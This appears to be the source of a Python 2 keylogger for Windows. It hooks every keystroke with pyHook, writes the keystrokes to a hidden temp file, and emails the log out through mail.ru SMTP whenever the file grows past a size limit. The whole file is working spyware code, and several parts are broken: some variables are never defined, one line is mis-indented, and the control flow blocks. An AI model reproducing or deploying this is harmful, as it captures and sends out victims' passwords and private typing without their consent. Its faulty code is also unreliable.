#Coded By : Ismael Al-safadi
# email ismaelalsafadi@protonmail.com

import pyHook, pythoncom, sys, logging ,getpass,requests
import tempfile ,os ,time,getpass
name_name=getpass.getuser()
p = tempfile.mkdtemp()
path + "\key.txt"
def OnKeyboardEvent(event):
    logging.basicConfig(filename=file_log, level=logging.DEBUG, format='%(message)s')
    chr(event.Ascii)
    logging.log(10,chr(event.Ascii))
    return True
hooks_manager = pyHook.HookManager()
hooks_manager.KeyDown = OnKeyboardEvent
hooks_manager.HookKeyboard()
pythoncom.PumpMessages()

def send():   
    import smtplib
    from email.MIMEMultipart import MIMEMultipart
    from email.MIMEBase import MIMEBase
    from email.MIMEText import MIMEText
    from email.Utils import COMMASPACE, formatdate
    from email import Encoders
    import os,datetime
     
    smtpUser = 'example@mail.ru'
    smtpPass = 'enter russian email password '

    toAdd = ''
    fromAdd = smtpUser

    today = datetime.date.today()

    subject  = 'Data File 01 %s' % today.strftime('%Y %b %d')
    header = 'To :' + toAdd + '\n' + 'From : ' + fromAdd + '\n' + 'Subject : ' + subject + '\n'
    body = 'This is a data file on %s' % today.strftime('%Y %b %d')

    attach = 'Data on %s.txt' % today.strftime('%Y-%m-%d')




    def sendMail(to, subject, text, files=[]):
        assert type(to)==list
        assert type(files)==list

        msg = MIMEMultipart()
        msg['From'] = smtpUser
        msg['To'] = COMMASPACE.join(to)
        msg['Date'] = formatdate(localtime=True)
        msg['Subject'] = subject

        msg.attach( MIMEText(text) )

        for file in files:
            part = MIMEBase('application', "octet-stream")
            part.set_payload( open(file,"rb").read() )
            Encoders.encode_base64(part)
            part.add_header('Content-Disposition', 'attachment; filename="%s"'
                           % os.path.basename(file))
            msg.attach(part)

        server = smtplib.SMTP('smtp.mail.ru:587')
        server.ehlo_or_helo_if_needed()
        server.starttls()
        server.ehlo_or_helo_if_needed()
        server.login(smtpUser,smtpPass)
        server.sendmail(smtpUser, to, msg.as_string())

        print 'Done ^__^ '



    sendMail( ['enter the email you want to send to  '],"this file from "+name_name , "enjoying your hacking ^__^", [path] )


        server.quit()

def send1():
    size=100000
    
    while True:
        
        if (os.path.exists(path)):
            x=os.path.getsize(path)
            x=str(x)
            c=x.replace("L","")
            c=int(c)
            if (c)>size:
                send()
                size=size+100000
            
        else:
            time.sleep(50000)
            continue

url='http://www.google.com/'
timeout=5
while True:
    try:
        requests.get(url, timeout=timeout)
        x="True"
    except requests.ConnectionError:
        c="False"

    if x =="True":
        send1()
        
    elif c=="False":
        continue
